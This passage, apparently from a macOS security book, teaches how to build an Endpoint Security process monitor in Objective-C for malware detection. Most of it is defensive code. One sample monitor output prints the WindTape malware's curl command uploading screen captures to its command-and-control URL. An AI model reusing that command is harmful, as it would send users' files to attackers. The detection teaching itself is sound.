es_new_client(&amp;client, ^(es_client_t* client, const es_message_t* message) { <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
    // Add code here to handle delivered events.&#13;
});&#13;
&#13;
if(ES_NEW_CLIENT_RESULT_SUCCESS != result) { <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
    // Add code here to handle error.&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-7: Creating a new Endpoint Security client</span></p>&#13;
<p class="TX">We invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span> API to create a new client instance <span class="CodeAnnotation" aria-label="annotation1">❶</span> and leave the handler block unimplemented for now. Assuming the call succeeds, we’ll have a newly initialized client. The code checks the result of the call against the <span class="SANS_TheSansMonoCd_W5Regular_11">ES_NEW_CLIENT_RESULT_SUCCESS</span> constant to confirm that this is the case <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Recall that if your project isn’t adequately entitled, if you’re <span role="doc-pagebreak" epub:type="pagebreak" id="pg_191" aria-label="191"/>running it via the terminal without granting it full disk access, or if your code isn’t running with root privileges, the call to <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span> will fail.</p>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
&#13;
<h4 class="H2" id="sec5"><span id="h2-62"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Subscribing to Events</span></h4>&#13;
<p class="TNI">With a client in hand, we can subscribe to the process execution and exiting events by invoking the <span class="SANS_TheSansMonoCd_W5Regular_11">es_subscribe</span> API (<a href="chapter8.xhtml#Lis8-8">Listing 8-8</a>).</p>&#13;
<span id="Lis8-8"/>&#13;
<pre><code>es_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_EXIT};&#13;
&#13;
// Removed code that invoked es_new_client&#13;
&#13;
es_subscribe(client, events, sizeof(events)/sizeof(events[0])); <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-8: Subscribing to process events of interest</span></p>&#13;
<p class="TX">Note that we compute the number of events rather than hardcoding it <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Once the <span class="SANS_TheSansMonoCd_W5Regular_11">es_subscribe</span> function returns, the Endpoint Security subsystem will begin asynchronously delivering events that match the types to which we have subscribed.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
&#13;
<h4 class="H2" id="sec6"><span id="h2-63"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Extracting Process Objects</span></h4>&#13;
<p class="TNI">This brings us to the final step, which is to handle the delivered events. I mentioned that the handler block gets invoked with two parameters: the client of type <span class="SANS_TheSansMonoCd_W5Regular_11">es_client_t</span> being sent the event and a pointer to the event message of type <span class="SANS_TheSansMonoCd_W5Regular_11">es_message_t</span>. If we’re not working with authorization events, the client isn’t directly relevant, but we’ll make use of the message, which contains the information about the delivered event.</p>&#13;
<p class="TX">First and foremost, we’ll extract a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure containing information about either the newly spawned process or the process that has just exited. Choosing which process structure to extract requires making use of the event type. For exiting (and most other) events, we’ll extract the message’s <span class="SANS_TheSansMonoCd_W5Regular_11">process</span> member, which contains a pointer to the process responsible for taking the action that triggered the event. However, in the case of process execution events, we’re more interested in accessing the process that was just spawned. Thus, we’ll use the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structure, whose <span class="SANS_TheSansMonoCd_W5Regular_11">target</span> member is a pointer to the relevant <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure (<a href="chapter8.xhtml#Lis8-9">Listing 8-9</a>).</p>&#13;
<span id="Lis8-9"/>&#13;
<pre><code>es_new_client(&amp;client, ^(es_client_t* client, const es_message_t* message) {&#13;
    es_process_t* process = NULL;&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> u_int32_t event = message-&gt;event_type;&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> switch(event) {&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> case ES_EVENT_TYPE_NOTIFY_EXEC:&#13;
          process = message-&gt;event.exec.target;&#13;
          ...&#13;
          break;&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_192" aria-label="192"/>      <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> case ES_EVENT_TYPE_NOTIFY_EXIT:&#13;
          process = message-&gt;process;&#13;
          ...&#13;
          break;&#13;
    }&#13;
    ...&#13;
});&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-9: Extracting the relevant process</span></p>&#13;
<p class="TX">We first extract the type of event from the message <span class="CodeAnnotation" aria-label="annotation1">❶</span>, then switch on it <span class="CodeAnnotation" aria-label="annotation2">❷</span> to extract a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure. In the case of a process execution event, we extract the process that was just spawned from the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structure <span class="CodeAnnotation" aria-label="annotation3">❸</span>. For process exit messages, we extract the process directly from the message <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
&#13;
<h4 class="H2" id="sec7"><span id="h2-64"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Extracting Process Information</span></h4>&#13;
<p class="TNI">Now that we have a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure, we can extract information such as the process’s audit token, PID, path, and code signing information. Also, for newly spawned processes, we can extract their arguments, and for exited processes, we can extract their exit code.</p>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
&#13;
<h5 class="H3" id="sec8"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Audit Tokens</span></h5>&#13;
<p class="TNI">Let’s start simple, by extracting the process’s audit token (<a href="chapter8.xhtml#Lis8-10">Listing 8-10</a>).</p>&#13;
<span id="Lis8-10"/>&#13;
<pre><code>NSData* auditToken = [NSData dataWithBytes:&amp;process-&gt;audit_token length:sizeof(audit_token_t)];</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-10: Extracting an audit token</span></p>&#13;
<p class="TX">The audit token is the first field in the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure, of type <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token_t</span>. You can use this value directly or, as done here, extract it into an <span class="SANS_TheSansMonoCd_W5Regular_11">NSData</span> object. Recall that an audit token allows you to uniquely and securely identify the process, as well as extract the other process’s information, such as its process ID. In <a href="chapter8.xhtml#Lis8-11">Listing 8-11</a>, we pass the audit token to the <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token_to_pid</span> function, which returns the PID.</p>&#13;
<span id="Lis8-11"/>&#13;
<pre><code>pid_t pid = audit_token_to_pid(process-&gt;audit_token);</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-11: Converting an audit token to a process ID</span></p>&#13;
<p class="TX">We can also extract the process’s effective UID from the audit token by means of the <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token_to_euid</span> function.</p>&#13;
<p class="TX">Note that invoking these functions requires you to import the <i>bsm/libbsm.h</i> header file and link against the <i>libbsm</i> library.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
&#13;
<h5 class="H3" id="sec9"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Process Paths</span></h5>&#13;
<p class="TNI">In <a href="chapter8.xhtml#Lis8-12">Listing 8-12</a>, we extract the process path via a pointer to a structure named <span class="SANS_TheSansMonoCd_W5Regular_11">executable</span> found within the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure. This points to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t</span> structure whose <span class="SANS_TheSansMonoCd_W5Regular_11">path</span> field contains the process’s path.</p>&#13;
<span id="Lis8-12"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_193" aria-label="193"/>NSString* path = [[NSString alloc] initWithBytes:process-&gt;executable-&gt;path.data&#13;
length:process-&gt;executable-&gt;path.length encoding:NSUTF8StringEncoding];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-12: Extracting a process’s path</span></p>&#13;
<p class="TX">Because this field is of type <span class="SANS_TheSansMonoCd_W5Regular_11">es_string_token_t</span>, we convert it into a more manageable string object.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
&#13;
<h5 class="H3" id="sec10"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Hierarchies</span></h5>&#13;
<p class="TNI">Using the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> process structure also simplifies building process hierarchies. We could extract the parent process’s ID from the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure. However, a comment in the <i>ESMessage.h</i> header file instead recommends using the <span class="SANS_TheSansMonoCd_W5Regular_11">parent_audit_token</span> field, available in Endpoint Security messages of version 4 and newer. In those versions, we’ll also find the audit token of the responsible process in a field aptly named <span class="SANS_TheSansMonoCd_W5Regular_11">responsible_audit_token</span>. In <a href="chapter8.xhtml#Lis8-13">Listing 8-13</a>, after ensuring that the message versions suffice, we extract these.</p>&#13;
<span id="Lis8-13"/>&#13;
<pre><code>pid_t ppid = process-&gt;ppid; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
if(message-&gt;version &gt;= 4) {&#13;
    NSData* parentToken = [NSData dataWithBytes:&amp;process-&gt;parent_audit_token&#13;
    length:sizeof(audit_token_t)]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    NSData* responsibleToken = [NSData dataWithBytes:&amp;process-&gt;responsible_audit_token&#13;
    length:sizeof(audit_token_t)]; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-13: Extracting a parent and responsible process token</span></p>&#13;
<p class="TX">We extract the parent PID <span class="CodeAnnotation" aria-label="annotation1">❶</span> and, for recent versions of Endpoint Security, the parent audit token <span class="CodeAnnotation" aria-label="annotation2">❷</span> and responsible process token <span class="CodeAnnotation" aria-label="annotation3">❸</span>. These can then be used to build a process hierarchy.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
&#13;
<h5 class="H3" id="sec11"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Script Paths</span></h5>&#13;
<p class="TNI">Recall that <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structures describe <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> events. So far, we’ve largely focused on the first field of this structure, a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure. However, other fields of the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event _exec_t</span> structure are useful to a process monitor, especially for heuristically detecting malware.</p>&#13;
<p class="TX">For example, consider cases when the process being executed is a <i>script interpreter</i>, a program used to run a script. When a user executes a script, the operating system will determine the correct script interpreter behind the scenes and invoke it to execute the script. In this case, Endpoint Security will report the script interpreter as the process executed and display its path, such as <i>/usr/bin/python3</i>. However, we’re more interested in <span role="doc-pagebreak" epub:type="pagebreak" id="pg_194" aria-label="194"/><i>what</i> the interpreter is executing. If we’re able to determine the path to the script being indirectly executed, we can then scan it for known malware or use heuristics to determine if it’s likely malicious.</p>&#13;
<p class="TX">Luckily, messages in versions 2 and above of Endpoint Security provide this path in the <span class="SANS_TheSansMonoCd_W5Regular_11">script</span> field of the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structure. If the newly spawned process is not a script interpreter, this field will be <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span>. Also, it won’t be set if the script was executed as an argument to the interpreter (for example, if the user ran <span class="SANS_TheSansMonoCd_W5Regular_11">python3</span> <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">&lt;path to some script&gt;</span>). In those cases, however, the script would show up as the process’s first argument.</p>&#13;
<p class="TX"><a href="chapter8.xhtml#Lis8-14">Listing 8-14</a> shows how to extract the path of a script via the <span class="SANS_TheSansMonoCd_W5Regular_11">script</span> field.</p>&#13;
<span id="Lis8-14"/>&#13;
<pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> if(message-&gt;version &gt;= 2) {&#13;
    es_string_token_t* token = &amp;message-&gt;event.exec.script-&gt;path;&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> if(NULL != token) {&#13;
        NSString* script = [[NSString alloc] initWithBytes:token-&gt;data&#13;
        length:token-&gt;length encoding:NSUTF8StringEncoding];&#13;
    }&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-14: Extracting a script path</span></p>&#13;
<p class="TX">We make sure we only attempt this extraction on compatible versions of Endpoint Security <span class="CodeAnnotation" aria-label="annotation1">❶</span> and if the <span class="SANS_TheSansMonoCd_W5Regular_11">script</span> field is not <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
<p class="TX">If you directly execute a Python script, the process monitoring code within <i>ESPlayground</i> will report Python as the spawned process, along with the path to the script:</p>&#13;
&#13;
<pre><code># <b>ESPlayground.app/Contents/MacOS/ESPlayground -monitor</b>&#13;
&#13;
ES Playground&#13;
Executing (process) 'monitor' logic&#13;
&#13;
event: ES_EVENT_TYPE_NOTIFY_EXEC&#13;
(new) process&#13;
    pid: 10267&#13;
    path: /usr/bin/python3&#13;
    script: /Users/User/Malware/Realst/<b>installer.py</b>"&#13;
    ...&#13;
</code></pre>&#13;
<p class="TX">This example captures the Realst malware, which contains a script named <i>installer.py</i>. Now we can inspect this script, which reveals malicious code designed to steal data and give attackers access to a user’s cryptocurrency wallet.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
&#13;
<h5 class="H3" id="sec12"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Binary Architecture</span></h5>&#13;
<p class="TNI">Another piece of information that Endpoint Security provides in the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structure is the process’s architecture. In <span class="Xref"><a href="chapter2.xhtml">Chapter 2</a></span>, I discussed how to determine the architecture programmatically for any running process, but conveniently, the Endpoint Security subsystem can do this as well.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_195" aria-label="195"/>To access the spawned process’s binary architecture, you can extract the <span class="SANS_TheSansMonoCd_W5Regular_11">image_cputype</span> field (and <span class="SANS_TheSansMonoCd_W5Regular_11">image_cpusubtype</span>, if you’re interested in the CPU subtype), as shown in <a href="chapter8.xhtml#Lis8-15">Listing 8-15</a>. This information is available only in versions 6 and above of Endpoint Security, so the code first checks for a compatible version.</p>&#13;
<span id="Lis8-15"/>&#13;
<pre><code>if(message-&gt;version &gt;= 6) {&#13;
    cpu_type_t cpuType = message-&gt;event.exec.image_cputype;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-15: Extracting a process’s architecture</span></p>&#13;
<p class="TX">This code should return values such as <span class="SANS_TheSansMonoCd_W5Regular_11">0x100000C</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">0x1000007</span>. By consulting Apple’s <i>mach/machine.h</i> header file, you can see that these map to <span class="SANS_TheSansMonoCd_W5Regular_11">CPU_TYPE_ARM64</span> (Apple Silicon) and <span class="SANS_TheSansMonoCd_W5Regular_11">CPU_TYPE_X86_64</span> (Intel), respectively.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
&#13;
<h5 class="H3" id="sec13"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Code Signing</span></h5>&#13;
<p class="TNI">In <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>, you saw how to leverage the rather archaic <span class="SANS_TheSansMonoCd_W5Regular_11">Sec*</span> APIs to manually extract code signing information. To simplify this extraction, Endpoint Security reports code signing information for the process responsible for the action that triggered the event in each message it delivers. Some events may also contain code signing information for other processes. For example, <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> events contain the code signing information for newly spawned processes.</p>&#13;
<p class="TX">You can find code signing information for processes in their <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure in the following fields:</p>&#13;
<blockquote>&#13;
<p class="EX1"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>uint32_t codesigning_flags</b></span> Contains a process’s code signing flags</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>bool is_platform_binary</b></span> Identifies platform binaries</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>uint8_t cdhash[20]</b></span> Stores the signature’s code directory hash</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>es_string_token_t signing_id</b></span> Stores the signature ID</p>&#13;
<p class="EX2"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>es_string_token_t team_id</b></span> Stores the team ID</p>&#13;
</blockquote>&#13;
<p class="TX">Let’s look at each of these fields, starting with <span class="SANS_TheSansMonoCd_W5Regular_11">codesigning_flags</span>, whose values can be found in Apple’s <i>cs_blobs.h</i> header file. <a href="chapter8.xhtml#Lis8-16">Listing 8-16</a> extracts the code signing flags from the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure and then checks them for several common code signing values. Because the value of the <span class="SANS_TheSansMonoCd_W5Regular_11">codesigning_flags</span> is a bit field, the code uses the logical AND (<span class="SANS_TheSansMonoCd_W5Regular_11">&amp;</span>) operator to check for specific code signing values.</p>&#13;
<span id="Lis8-16"/>&#13;
<pre><code>// Process is an es_process_t*&#13;
#import &lt;kernel/kern/cs_blobs.h&gt;&#13;
&#13;
uint32_t csFlags = process-&gt;codesigning_flags;&#13;
&#13;
if(CS_VALID &amp; csFlags) {&#13;
    // Add code here to handle dynamically valid process signatures.&#13;
}&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_196" aria-label="196"/>if(CS_SIGNED &amp; csFlags) {&#13;
    // Add code here to handle process signatures.&#13;
}&#13;
if(CS_ADHOC &amp; csFlags) {&#13;
    // Add code here to handle ad hoc process signatures.&#13;
}&#13;
...&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-16: Extracting a process’s code signing flags</span></p>&#13;
<p class="TX">Accessing and then extracting code signing flags could allow you to do things like investigate spawned processes whose signatures are ad hoc, meaning they’re untrusted. The widespread 3CX supply chain attack used a second-stage payload that was signed with an ad hoc signature.<sup><a role="doc-noteref" id="chapter8_3" href="#chapter8-3">3</a></sup></p>&#13;
<p class="TX">Also within the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure, you’ll find the <span class="SANS_TheSansMonoCd_W5Regular_11">is_platform_binary</span> field, which is a Boolean flag set to true for binaries that are part of macOS and signed solely with Apple certificates. It’s important to note that for Apple applications that aren’t preinstalled in macOS, such as Xcode, this field will be set to false. It’s also worth noting that the <span class="SANS_TheSansMonoCd_W5Regular_11">CS_PLATFORM_BINARY</span> flag doesn’t appear to be set in the <span class="SANS_TheSansMonoCd_W5Regular_11">codesigning_flags</span> field for platform binaries, so consult the value of the <span class="SANS_TheSansMonoCd_W5Regular_11">is_platform_binary</span> field for this information instead.</p>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">WARNING</span></p>&#13;
<p class="NOTE-TXT"><i>If you’ve disabled AMFI, Endpoint Security may mark all processes, including third-party and potentially malicious ones, as platform binaries. Therefore, if you conduct tests on a machine with AMFI disabled, any decisions you make based on the is_platform_binary value will likely be incorrect.</i></p>&#13;
<p class="TX">I mentioned earlier in this chapter that you may be able to safely ignore platform binaries, as they’re part of the operating system. The reality isn’t quite this simple, however. You might want to account for <i>living off the land binaries (LOLBins)</i>, which are platform binaries that attackers can abuse to perform malicious actions on their behalf. One example is Python, which can execute malicious scripts as we just saw with the Realst malware. Other LOLBins may be more subtle. For example, malware could use the built-in <span class="SANS_TheSansMonoCd_W5Regular_11">whois</span> tool to surreptitiously exfiltrate network traffic in an undetected manner if host-based security tools naively allow all traffic from platform binaries.<sup><a role="doc-noteref" id="chapter8_4" href="#chapter8-4">4</a></sup></p>&#13;
<p class="TX">Given a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure, you can easily extract the <span class="SANS_TheSansMonoCd_W5Regular_11">is_platform_binary</span> field. In <a href="chapter8.xhtml#Lis8-17">Listing 8-17</a>, we convert it to an object so we can, for example, store it in a dictionary.</p>&#13;
<span id="Lis8-17"/>&#13;
<pre><code>// Process is an es_process_t*&#13;
&#13;
NSNumber* isPlatformBinary = [NSNumber numberWithBool:process-&gt;is_platform_binary];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-17: Extracting a process’s platform binary status</span></p>&#13;
<p class="TX">Your code might not make use of the <span class="SANS_TheSansMonoCd_W5Regular_11">cdhash</span> field, but <a href="chapter8.xhtml#Lis8-18">Listing 8-18</a> shows how to extract and convert it into an object by making use of the <span class="SANS_TheSansMonoCd_W5Regular_11">CS_CDHASH_LEN</span> constant found in Apple’s <i>cs_blobs.h</i> header file.</p>&#13;
<span id="Lis8-18"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_197" aria-label="197"/>// Process is an es_process_t*&#13;
&#13;
NSData* cdHash = [NSData dataWithBytes:(const void *)process-&gt;cdhash&#13;
length:sizeof(uint8_t)*CS_CDHASH_LEN];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-18: Extracting a process’s code signing hash</span></p>&#13;
<p class="TX">Next in the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure are the signing and team identifiers, stored as string tokens. As was discussed in <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>, these can tell you who signed the item and what team they’re a part of, which can reduce false positives or detect other related malware. As each of these values is an <span class="SANS_TheSansMonoCd_W5Regular_11">es_string_token_t</span>, you’ll probably once again want to store them as more manageable objects (<a href="chapter8.xhtml#Lis8-19">Listing 8-19</a>).</p>&#13;
<span id="Lis8-19"/>&#13;
<pre><code>// Process is an es_process_t*&#13;
&#13;
NSString* signingID = [[NSString alloc] initWithBytes:process-&gt;signing_id.data&#13;
length:process-&gt;signing_id.length encoding:NSUTF8StringEncoding];&#13;
&#13;
NSString* teamID = [[NSString alloc] initWithBytes:process-&gt;team_id.data&#13;
length:process-&gt;team_id.length encoding:NSUTF8StringEncoding];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-19: Extracting a process’s signing and team IDs</span></p>&#13;
<p class="TX">With this code signing extraction code added to the process monitoring logic in <i>ESPlayground</i>, let’s execute the aforementioned second-stage payload, <i>UpdateAgent</i>, used in the 3CX supply chain attack. It’s clear that the payload is signed with an ad hoc certificate (<span class="SANS_TheSansMonoCd_W5Regular_11">CS_ADHOC</span>), which is often a red flag:</p>&#13;
&#13;
<pre><code># <b>ESPlayground.app/Contents/MacOS/ESPlayground -monitor</b>&#13;
&#13;
ES Playground&#13;
Executing (process) 'monitor' logic&#13;
&#13;
event: ES_EVENT_TYPE_NOTIFY_EXEC&#13;
(new) process&#13;
  pid: 10815&#13;
  path: /Users/User/Malware/3CX/UpdateAgent&#13;
  ...&#13;
  code signing flags: 0x22000007&#13;
  code signing flag 'CS_VALID' is set&#13;
  code signing flag 'CS_SIGNED' is set&#13;
  code signing flag 'CS_ADHOC' is set&#13;
</code></pre>&#13;
<p class="TX">With this code signing information made available by Endpoint Security, we’re close to wrapping up the process monitor’s logic.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
&#13;
<h5 class="H3" id="sec14"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Arguments</span></h5>&#13;
<p class="TNI">Let’s consider message-specific contents, starting with the process arguments found in <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> messages. In <span class="Xref"><a href="chapter1.xhtml">Chapter 1</a></span>, I discussed the usefulness of process arguments for detecting malicious code and <span role="doc-pagebreak" epub:type="pagebreak" id="pg_198" aria-label="198"/>programmatically extracted them from running processes. If you’ve subscribed to Endpoint Security events of type <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span>, you’ll see that Endpoint Security has done most of the heavy lifting for you.</p>&#13;
<p class="TX">These events are <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structures that you can pass to two Endpoint Security helper APIs, <span class="SANS_TheSansMonoCd_W5Regular_11">es_exec_arg_count</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">es_exec_arg</span>, to extract the arguments that triggered the Endpoint Security event (<a href="chapter8.xhtml#Lis8-20">Listing 8-20</a>).</p>&#13;
<span id="Lis8-20"/>&#13;
<pre><code>NSMutableArray* arguments = [NSMutableArray array];&#13;
&#13;
const es_event_exec_t* exec = &amp;message-&gt;event.exec;&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> for(uint32_t i = 0; i &lt; es_exec_arg_count(exec); i++) {&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> es_string_token_t token = es_exec_arg(exec, i);&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> NSString* argument = [[NSString alloc] initWithBytes:token.data&#13;
    length:token.length encoding:NSUTF8StringEncoding];&#13;
&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> [arguments addObject:argument];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-20: Extracting a process’s arguments</span></p>&#13;
<p class="TX">After initializing an array to hold the arguments, the code invokes <span class="SANS_TheSansMonoCd_W5Regular_11">es_exec_arg_count</span> to determine the number of arguments <span class="CodeAnnotation" aria-label="annotation1">❶</span>. We perform this check within the initialization of a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop to keep track of how many times we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">es_exec_arg</span> function. Then we invoke the function with the current index to retrieve the argument at that index <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Because the argument is stored in an <span class="SANS_TheSansMonoCd_W5Regular_11">es_string_token_t</span> structure, the code converts it into a string object <span class="CodeAnnotation" aria-label="annotation3">❸</span> and adds it to an array <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">When we add this code to the <i>ESPlayground</i> project, we’re now able to observe process arguments, such as when the WindTape malware executes <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to exfiltrate recorded screen captures to the attackers’ command-and-control server:</p>&#13;
&#13;
<pre><code># <b>ESPlayground.app/Contents/MacOS/ESPlayground -monitor</b>&#13;
&#13;
ES Playground&#13;
Executing (process) 'monitor' logic&#13;
&#13;
event: ES_EVENT_TYPE_NOTIFY_EXEC&#13;
(new) process&#13;
 pid: 18802&#13;
 path: /usr/bin/curl&#13;
 ...&#13;
 arguments : (&#13;
  "/usr/bin/curl"&#13;
  "http://string2me.com/xnrftGrNZlVYWrkrqSoGzvKgUGpN/zgrcJOQKgrpkMLZcu.php",&#13;
  "-F",&#13;
  "qwe=@/Users/User/Library/lsd.app/Contents/Resources/14-06 06:28:07.jpg",&#13;
  "-F",&#13;
  "rest=BBA441FE-7BBB-43C6-9178-851218CFD268",&#13;
  "-F",&#13;
  "fsbd=Users-Mac.local-User"&#13;
)&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_199" aria-label="199"/>You could use the similar functions <span class="SANS_TheSansMonoCd_W5Regular_11">es_exec_env_count</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">es_exec_env</span> to extract a process’s environment variables from an <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structure.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
&#13;
<h5 class="H3" id="sec15"><span class="SANS_Futura_Std_Bold_Condensed_B_11">Exit Status</span></h5>&#13;
<p class="TNI">When a process exits, we’ll receive a message from Endpoint Security because we’ve subscribed to <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXIT</span> events. Knowing when a process exits is useful for purposes such as the following:</p>&#13;
<blockquote>&#13;
<p class="EX1"><b>Determining whether a process succeeded or failed</b> A process’s exit code provides insight into whether the process executed successfully. If the process is, for example, a malicious installer, this information could help us determine its impact.</p>&#13;
<p class="EX2"><b>Performing any necessary cleanup</b> In many cases, security tools track activity over the lifetime of a process. For example, a ransomware detector could monitor each new process to detect those that rapidly create encrypted files. When a process exits, the detector can perform any necessary cleanup, such as freeing the processes list of created files and removing the process from any caches.</p>&#13;
</blockquote>&#13;
